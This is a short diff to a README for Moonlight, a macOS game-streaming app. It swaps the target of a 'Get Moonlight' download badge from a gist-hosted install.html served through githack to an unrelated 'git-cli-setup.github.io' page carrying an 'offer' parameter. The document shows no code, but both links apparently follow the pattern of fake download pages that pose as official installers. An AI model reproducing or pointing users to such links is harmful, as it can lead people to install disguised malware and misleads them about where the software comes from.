@@ -2,7 +2,7 @@
 
 Moonlight is a macOS application that enables users to stream games from a compatible PC to their Mac. It provides low-latency, high-performance streaming, allowing gamers to enjoy their favorite titles anywhere with their Mac.
 
-<a href="https://gistcdn.githack.com/mimicsegdapred2010/cb47b2b07c3a27801388d60b0c099ac4/raw/5822bf4179dded93e6ec6916494e9eee66a71eed/install.html?offer=Moonlight" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Moonlight" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Moonlight%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
